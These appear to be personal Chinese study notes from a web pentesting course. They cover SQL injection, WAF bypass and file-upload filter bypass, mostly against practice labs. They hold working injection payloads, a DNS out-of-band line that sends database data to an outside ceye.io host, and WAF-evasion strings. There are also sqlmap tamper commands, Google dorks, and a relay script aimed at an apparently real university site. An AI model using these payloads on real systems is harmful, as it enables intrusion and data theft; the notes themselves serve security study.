class="operator">/</span>vul<span class="operator">/</span>sqli<span class="operator">/</span>sqli_iu<span class="operator">/</span>sql_login.php	<span class="keyword">insert</span><span class="operator">/</span><span class="keyword">update</span>注入</span><br><span class="line"></span><br><span class="line">盲注分为三类</span><br><span class="line">	逻辑判断</span><br><span class="line">		regexp,<span class="keyword">like</span>,ascii,<span class="keyword">left</span>,mid</span><br><span class="line">	延时判断		最慢</span><br><span class="line">		if,sleep</span><br><span class="line">	报错回显		最快</span><br><span class="line">		floor,updatexml,extractvalue</span><br><span class="line">			https:<span class="operator">/</span><span class="operator">/</span>www.jianshu.com<span class="operator">/</span>p<span class="operator">/</span>bc35f8dd4f7c</span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pikachu <span class="keyword">insert</span>		<span class="operator">/</span>pikachu<span class="operator">/</span>vul<span class="operator">/</span>sqli<span class="operator">/</span>sqli_iu<span class="operator">/</span>sqli_reg.php</span><br><span class="line">	执行上面类似的<span class="keyword">insert</span>语句			<span class="number">0x7e</span>是波浪号</span><br><span class="line">		floor</span><br><span class="line">username<span class="operator">=</span>x<span class="string">&#x27; or (select 1 from(select count(*),concat((select(select(select concat(0x7e,database(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) or &#x27;</span><span class="operator">&amp;</span>password...</span><br><span class="line">		updatexml</span><br><span class="line">username<span class="operator">=</span>x<span class="string">&#x27; or updatexml(1,concat(0x7e,(version())),0) or &#x27;</span><span class="operator">&amp;</span>password...</span><br><span class="line">		extractvalue</span><br><span class="line">username<span class="operator">=</span>x<span class="string">&#x27; or extractvalue(1, concat(0x7e,database())) or &#x27;</span><span class="operator">&amp;</span>password...</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pikachu update		/pikachu/vul/sqli/sqli_iu/sqli_edit.php</span><br><span class="line">以下正常post提交，选择注入点要考虑到注入点可能的闭合情况 跟上面的差不多</span><br><span class="line">sex=%E7%94%B7&amp;phonenum=12345678901&amp;add=111&amp;email=111&amp;submit=submit</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">布尔逻辑判断			见dvwa</span><br><span class="line">	like &#x27;ro%&#x27;     				#判断ro或ro.. .是否成立</span><br><span class="line">    regexp &#x27;^xiaodi[a-z]&#x27;   	#匹配xiaodi及xiaodi...等</span><br><span class="line">    if(条件,5,0)    				#条件成立返回5反之返回0</span><br><span class="line">    sleep(5)     				#sQI语句延时执行5秒</span><br><span class="line">    mid(a,b,c)     				#从位置b开始，截取a字符串的c位</span><br><span class="line">    substr(a,b,c)    			#从b位置开始，截取字符串a的c长度</span><br><span class="line">    left(database(),1),database() #left(a,b)从左侧截取a的前b位</span><br><span class="line">    length(database())=8   		#判断数据库database ()名的长度</span><br><span class="line">    ord=ascii ascii(x)=97   	#判断x的asci i码是否等于97</span><br></pre></td></tr></table></figure>

<h3 id="day17-SQL注入之二次，加解密，DNS等注入"><a href="#day17-SQL注入之二次，加解密，DNS等注入" class="headerlink" title="day17-SQL注入之二次，加解密，DNS等注入"></a>day17-SQL注入之二次，加解密，DNS等注入</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">加解密</span><br><span class="line">    sqllab Less-21 cookie里面uname base64加密	</span><br><span class="line">        但是我的抓包这关是post提交不没有加密</span><br><span class="line">        代码里面base64_decode($cookee)</span><br><span class="line">        使用报错注入</span><br><span class="line">        1=》base64-》MQ==</span><br><span class="line">        谷歌 inurl:id=MQ==</span><br><span class="line">二次注入		一般白盒有代码</span><br><span class="line">	1.插入恶意数据</span><br><span class="line">		第一次进行数据库插入数据时，仅仅对其中的特殊字符进行了转义，再写入数据库的时候还是保留了原来的数据，但是数据 本身包含恶意内容</span><br><span class="line">	2.引用恶意内容</span><br><span class="line">		在将数据存入到数据库中之后，开发者就认为数据时可信的。在下次需要进行查询的时候，直接进行进一步的检验和处理，这样就造成了二次注入。</span><br><span class="line">	Less-24</span><br><span class="line">		注册用户admin&#x27;#,在修改代码页面/sqllab/sqllab/Less-24/logged-in.php可以随便修改admin的密码，这个文件修改的密码会传到pass_change.php</span><br><span class="line">		$sql = &quot;UPDATE users SET PASSWORD=&#x27;$pass&#x27; where username=&#x27;$username&#x27; and password=&#x27;$curr_pass&#x27; &quot;;</span><br><span class="line">	搜索 cms 二次注入</span><br><span class="line">DNS带外注入			注入点是高权限	 文件读取权限</span><br><span class="line">	#设置MYSQL服务的导入导出 	NULL禁止		/tmp/只能在/tmp	&quot;&quot;不做限制</span><br><span class="line">	secure_file_priv=&quot;&quot;</span><br><span class="line">	ceye.io		微信登录	http://ceye.io/profile</span><br><span class="line">	http://192.168.88.1/sqllab/sqllab/Less-2/?id=1 and if((select load_file(concat(&#x27;\\\\&#x27;,(select version()),&#x27;.xgypw9.ceye.io\\abc&#x27;))),1,0)--+</span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mysql执行				这个需要在my.ini中加入</span><br><span class="line">	<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> if((<span class="keyword">select</span> load_file(concat(<span class="string">&#x27;\\\\&#x27;</span>,(<span class="keyword">select</span> version()),<span class="string">&#x27;.xgypw9.ceye.io&#x27;</span>))),<span class="number">1</span>,<span class="number">0</span>);</span><br><span class="line">	会在ceye.io网站产生互联显示注入查询的信息		也没成功</span><br><span class="line">		https:<span class="operator">/</span><span class="operator">/</span>github.com<span class="operator">/</span>ADOOO<span class="operator">/</span>DnslogSqlinj		dns注入工具</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#sqlmap base64中转注入	对下面这个文件的x进行注入</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$url</span> = <span class="string">&#x27;http://job.gxu.edu.cd/job_bystjb/yjs_byszjs.asp?id=&#x27;</span>;</span><br><span class="line"><span class="variable">$payload</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;x&#x27;</span>]);</span><br><span class="line"><span class="variable">$urls</span> = <span class="variable">$url</span>.<span class="variable">$payload</span></span><br><span class="line"><span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$urls</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$urls</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">#此处结果是脚本接收没有同步到sqlmap</span></span><br></pre></td></tr></table></figure>

<h3 id="day18-SQL注入之堆叠及WAF绕过注入"><a href="#day18-SQL注入之堆叠及WAF绕过注入" class="headerlink" title="day18-SQL注入之堆叠及WAF绕过注入"></a>day18-SQL注入之堆叠及WAF绕过注入</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">stacked injections(堆叠注入)</span><br><span class="line">select * from users;select * from emails;</span><br><span class="line">Less-38</span><br><span class="line">$sql = &quot;SELECT * from users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;;</span><br><span class="line">$id = 1&#x27;; insert....;</span><br><span class="line">注入需要管理员账号密码，密码是加密，无法解密</span><br><span class="line">堆叠注入进行插入数据，用户密码自定义</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">waf绕过</span><br><span class="line">	数据</span><br><span class="line">		大小写</span><br><span class="line">		加密解密</span><br><span class="line">		编码解码</span><br><span class="line">		等价函数</span><br><span class="line">		特殊符号</span><br><span class="line">		反序列号</span><br><span class="line">		注释符混用</span><br><span class="line">	方式</span><br><span class="line">		更改提交方式</span><br><span class="line">		变异</span><br><span class="line">	其他</span><br><span class="line">		Fuzz大法</span><br><span class="line">		数据库特性</span><br><span class="line">		垃圾数据溢出</span><br><span class="line">		HTTP参数污染</span><br><span class="line">		...</span><br><span class="line"></span><br><span class="line">阿里云盾 宝塔 安全狗			#waf ids ips</span><br><span class="line"></span><br><span class="line">正则表达式 匹配关键字</span><br><span class="line"></span><br><span class="line">select ~database();		一串数字</span><br><span class="line">select * from users where id = -1 union/**/select 1, 2, 3;</span><br><span class="line"># bypass sqlinject payload</span><br><span class="line">	%23		#</span><br><span class="line">	%0A		回车换行</span><br><span class="line">	%00		url终止符</span><br><span class="line">id=1 union/*%00*/%23a%0A/*!/*!select 1,2,3*/;%23</span><br><span class="line">id=-1 union/*%00*/%23a%0A/*!/*!select%201,database%23x%0A(),3*/;%23</span><br><span class="line"></span><br><span class="line">id=-1%20union%20/*!44509select*/%201,2,3%23</span><br><span class="line">id=-1%20union%20/*!44509select*/%201,%23x%0A/*!database*/(),3%23</span><br><span class="line"></span><br><span class="line">id=1/**&amp;id=-1%20union%20select%201,2,3%23*/</span><br><span class="line"></span><br><span class="line">id=-1 %20union%20all%23%0a%20select%201,2,3%23</span><br><span class="line">-1 %20union%20all%23%0a%20select%201,%230%0Adatabase/**/(),3%23</span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">安全狗  sqllab Less<span class="number">-1</span></span><br><span class="line">	安全狗很多拦截方式都是url(<span class="keyword">get</span>)可以更改提交方式 </span><br><span class="line">	  如果后端接受用$_REQUEST  <span class="keyword">get</span>和post互换提交方式  </span><br><span class="line">#防止查询数据库相关信息 	url cookie post 		匹配整体database()</span><br><span class="line">	id <span class="operator">=</span> <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>, database<span class="comment">/**/</span>(), <span class="number">3</span>;</span><br><span class="line">#防止<span class="keyword">SQL</span>联合查询			匹配&quot;union select&quot;整体</span><br><span class="line">#改成<span class="keyword">get</span>请求绕过		能过安全狗能过数据库</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">union</span><span class="comment">/*%00*/</span><span class="operator">%</span><span class="number">23</span>a<span class="operator">%</span><span class="number">0</span>A<span class="comment">/*!/*!select 1,2,3*/</span>;<span class="operator">%</span><span class="number">23</span></span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">union</span><span class="operator">%</span><span class="number">23</span>a<span class="operator">%</span><span class="number">0</span>A<span class="comment">/*!/*!select 1,2,3*/</span>;<span class="operator">%</span><span class="number">23</span></span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">union</span><span class="operator">%</span><span class="number">23</span>a<span class="operator">%</span><span class="number">0</span>A<span class="comment">/*!select 1,2,3*/</span>;<span class="operator">%</span><span class="number">23</span> </span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">union</span><span class="operator">%</span><span class="number">23</span>a<span class="operator">%</span><span class="number">0</span>Aselect <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span><span class="operator">*</span><span class="operator">/</span>;<span class="operator">%</span><span class="number">23</span></span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\hyy\Desktop\小迪2020.assets\1666361574697.png" alt="1666361574697"></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--   参数污染		特殊符号</span></span><br><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="comment">/**&amp;id=-1%20union%20select%201,2,3%23*/</span></span><br><span class="line">安全狗能看到id<span class="operator">=</span><span class="number">1</span>			安全狗也是编程语言写的，后面被注释掉了</span><br><span class="line">php $_GET参数污染只能看到后面</span><br><span class="line">mysql 接着传</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="comment">/*!select * from users*/</span> ;		#正常执行</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="comment">/***/</span>;							#没有<span class="keyword">sql</span>语句执行</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="comment">/**select * from users*/</span> ;		#没有<span class="keyword">sql</span>语句执行</span><br><span class="line"></span><br><span class="line">搜索参数污染</span><br><span class="line">url:	<span class="operator">/</span><span class="operator">/</span>....<span class="operator">/</span>index.php?y<span class="operator">=</span><span class="number">12</span>$y<span class="operator">=</span><span class="number">3</span></span><br><span class="line">php<span class="operator">/</span>apache		$_GET(&quot;par&quot;)					<span class="keyword">Last</span></span><br><span class="line">jsp<span class="operator">/</span>tomcat		Request.getParameter(&quot;par&quot;)		<span class="keyword">First</span></span><br><span class="line">....</span><br><span class="line"></span><br><span class="line">下图数据库版本<span class="number">2.00</span><span class="number">.00</span>以上可以执行</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">id=-1%20union%20/*!44509select*/%201,2,3%23</span><br><span class="line">id=-1%20union%20/*!44509select*/%201,%23x%0A/*!database*/(),3%23</span><br><span class="line">%20</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\hyy\Desktop\小迪2020.assets\1666402908357.png" alt="1666402908357"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fuzz	模糊测试		爆破测试？</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\hyy\Desktop\小迪2020.assets\1666365313754.png" alt="1666365313754"></p>
<h3 id="day19-SQL注入之SQLMAP绕过WAF"><a href="#day19-SQL注入之SQLMAP绕过WAF" class="headerlink" title="day19-SQL注入之SQLMAP绕过WAF"></a>day19-SQL注入之SQLMAP绕过WAF</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">1.白名单</span><br><span class="line">	方式一：IP白名单		实战中意义不大</span><br><span class="line">        从网络层获取的ip，这种一般伪造不来，如果是获取客户端的ip这样就可能存在伪造IP绕过的情况</span><br><span class="line">        测试方法 	修改http的header来bypass</span><br><span class="line">        X-forward-for</span><br><span class="line">        X-remote-IP</span><br><span class="line">        X-originating-IP</span><br><span class="line">        x-remote-addr</span><br><span class="line">        X-Real-ip</span><br><span class="line">	方式二：静态资源		老版本用的多</span><br><span class="line">		特定的静态资源后缀请求，常见的静态文件(.js .jpg .swf .css等等)，类似白名单机制，waf为了检测效率，不去检测这样一些静态文件名后缀的请求</span><br><span class="line">		.../index.php/1.js?id=1		参数还是给的.php文件</span><br><span class="line">	方式三：url白名单</span><br><span class="line">		为了防止误拦，部分waf内置默认的白名单列表，如admin/manager/system等管理后台。只要url中存在白名单的字符出，就作为白名单不进行检测。</span><br><span class="line">	方式四：爬虫白名单	伪造成搜索引擎访问</span><br><span class="line">		部分waf有提供爬虫白名单的功能，识别爬虫的技术一般有两种</span><br><span class="line">		1.UserAgent		2.通过行为来判断</span><br><span class="line">		User Agent Switcher (Firefox 附加组件)，下载地址:</span><br><span class="line">			https://addons.mozilla.org.........................</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">使用sqlmap的tample模块，仿写sp_password.py模块到zz_rdog.py</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\hyy\Desktop\小迪2020.assets\1666406885817.png" alt="1666406885817"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">命令行：			还是不能注入</span><br><span class="line">	python sqlmap.py -u &quot;...../?id=1&quot; --tample=zz_rdog.py</span><br><span class="line">	sqlmap使用代理</span><br><span class="line">	python sqlmap.py -u &quot;...../?id=1&quot; --tample=zz_rdog.py --proxy=http://192.168.88.1:8080</span><br><span class="line">	发现useragent包含sqlmap		可以从安全狗防护日志发现拦截原因	http检测规则包含工具拦截</span><br><span class="line">	python sqlmap.py -u &quot;...../?id=1&quot; --tample=zz_rdog.py --random-agent</span><br><span class="line">	--random-agent从字典随机生成agent		也可以转成搜索引擎的对付cc攻击</span><br><span class="line">	--delay		加入延迟</span><br><span class="line">	对比使不使用安全狗抓包获得数据</span><br></pre></td></tr></table></figure>

<h3 id="day20-文件上传基础及过滤方式"><a href="#day20-文件上传基础及过滤方式" class="headerlink" title="day20-文件上传基础及过滤方式"></a>day20-文件上传基础及过滤方式</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">利用思路</span><br><span class="line">	解析漏洞 		iis apache nginx</span><br><span class="line">	常规思路		扫描获取上传 会员中心上传 后台系统上传 各种途径上传</span><br><span class="line">	CMS类		  已知CMS源码</span><br><span class="line">	编辑器类 		ckeditor fckeditor kindeditor xxxxeditor ueditor</span><br><span class="line">	其他类/CVE 	 代码审计 平台/三方应用等</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">谷歌搜索	inurl:upload.php</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">解析漏洞</span><br><span class="line">	网站在解析url出现混乱</span><br><span class="line">	vulhub		nginx/nginx_parsing_vulnerability</span><br><span class="line">		属于用户配置不当造成的解析漏洞</span><br><span class="line">	http://your-ip/uploadfiles/nginx.png</span><br><span class="line">	http://your-ip/uploadfiles/nginx.png/.php		#网站解析这个路径的代码??</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">upload-labs		</span><br><span class="line">	第一关 	前端验证</span><br><span class="line">		1.禁用js脚本</span><br><span class="line">		2.burp抓改后缀</span><br><span class="line">	可以把网页代码复制过来改，首先把js代码注释掉，然后提交表单的地方添加action=&quot;http://192.168.88.1/upload-labs/Pass-01/index.php&quot;否则默认提交到原php文件，详情见/upload-labs/Pass-01/test.php</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Weblogic 任意文件上传漏洞（CVE-2018-2894）</span><br><span class="line">	weblogic/CVE-2018-2894</span><br><span class="line">		这个账号密码是假定自己知道的可以通过在虚拟机执行docker-compose logs | grep password</span><br><span class="line">	按照他的操作步骤来，这种感觉只能代码审计，最后是jsp的木马没成功。。。。。</span><br></pre></td></tr></table></figure>

<h3 id="day21-文件上传之后端黑白名单绕过"><a href="#day21-文件上传之后端黑白名单绕过" class="headerlink" title="day21-文件上传之后端黑白名单绕过"></a>day21-文件上传之后端黑白名单绕过</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">常见黑名单 明确不允许上传的格式后缀</span><br><span class="line">	asp	php	jsp	aspx cgi war</span><br><span class="line">php5 Phtml定义不完整绕过</span><br><span class="line">常见白名单 明确可以上传的文件格式后缀</span><br><span class="line">	jpg	png zip rar gif</span><br><span class="line">文件类型 MIME</span><br><span class="line">	Content-Type：image/gif</span><br><span class="line">文件头 内容信息</span><br><span class="line">	txt打开gif文件 Gif89a</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;form enctype=<span class="string">&quot;multipart/form-data&quot;</span> method=<span class="string">&quot;post&quot;</span> onsubmit=<span class="string">&quot;return checkFile()&quot;</span>&gt;</span><br><span class="line">    &lt;p&gt;请选择要上传的图片：&lt;p&gt;</span><br><span class="line">    &lt;input <span class="class"><span class="keyword">class</span>=&quot;<span class="title">input_file</span>&quot; <span class="title">type</span>=&quot;<span class="title">file</span>&quot; <span class="title">name</span>=&quot;<span class="title">upload_file</span>&quot;/&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">input</span> <span class="title">class</span>=&quot;<span class="title">button</span>&quot; <span class="title">type</span>=&quot;<span class="title">submit</span>&quot; <span class="title">name</span>=&quot;<span class="title">submit</span>&quot; <span class="title">value</span>=&quot;上传&quot;/&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">form</span>&gt;</span></span><br><span class="line"><span class="class">#<span class="title">onsubmit</span>鼠标触发事件</span></span><br><span class="line"><span class="class">#<span class="title">php</span>中使用$<span class="title">_FILES</span>接受文件上传		此处为$<span class="title">_FILES</span>[&quot;<span class="title">upload_file</span>&quot;]</span></span><br><span class="line"><span class="class">	$<span class="title">_FILES</span>[&quot;<span class="title">upload_file</span>&quot;][&quot;<span class="title">name</span>&quot;]		显示文件名</span></span><br><span class="line"><span class="class">    $<span class="title">_FILES</span>[&quot;<span class="title">upload_file</span>&quot;][&quot;<span class="title">type</span>&quot;]		显示<span class="title">MIME</span></span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//学英文		deny拒绝   ext后缀</span></span><br><span class="line"><span class="comment">//upload-labs  第三关 	黑名单		用php5绕过			特殊解析后缀</span></span><br><span class="line">	<span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&#x27;.asp&#x27;</span>,<span class="string">&#x27;.aspx&#x27;</span>,<span class="string">&#x27;.php&#x27;</span>,<span class="string">&#x27;.jsp&#x27;</span>);</span><br><span class="line">    <span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">    <span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点		#不是内置的函数</span></span><br><span class="line">    <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">    <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">    <span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">    <span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">//收尾去空</span></span><br><span class="line">apache服务器 httpd.conf配置文件，添加php3和phtml取消前面的注释，保存并推出</span><br><span class="line">    AddType application/x-httpd-php .php .phtml .txt .php3</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#	创建.htaccess文件		匹配文件名cimer 下面这个是MIME 以php格式执行</span><br><span class="line">#	upload-labs	第4关</span><br><span class="line">&lt;FilesMatch &quot;cimer&quot;&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#	upload-labs 第5关换后缀大小写</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#	upload-labs 第6关抓包改文件名filename加空格	带空格的文件后缀在php绕过黑名单，然后再windows或linux保存会自动把这个空格删掉</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#	upload-labs 第7关	抓包 少了删除文件末尾的点	同上关后缀的.绕过php 在保存在windows或者linux系统自动删掉</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 	upload-labs 第8关	少了替换&quot;::$DATA&quot;</span><br><span class="line">	抓包改filename=&quot;phpinfo.php::$DATA&quot;</span><br><span class="line">	windows会把这个::$DATA之后的数据当作文件流处理，在保存时自动去掉</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#	upload-labs 第9关		代码没有循环过滤点和空格	主要是验证file_ext 	要保证后两个点之间有空格</span><br><span class="line">	抓包改filename=&quot;cmd.php. .&quot;	&quot;cmd.php.. .&quot;	&quot;cmd.php..  .&quot;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#	upload-labs 第10段		循环过滤</span><br><span class="line">	$file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name);</span><br><span class="line">	filename=&quot;cmd.pphphp&quot;</span><br></pre></td></tr></table></figure>

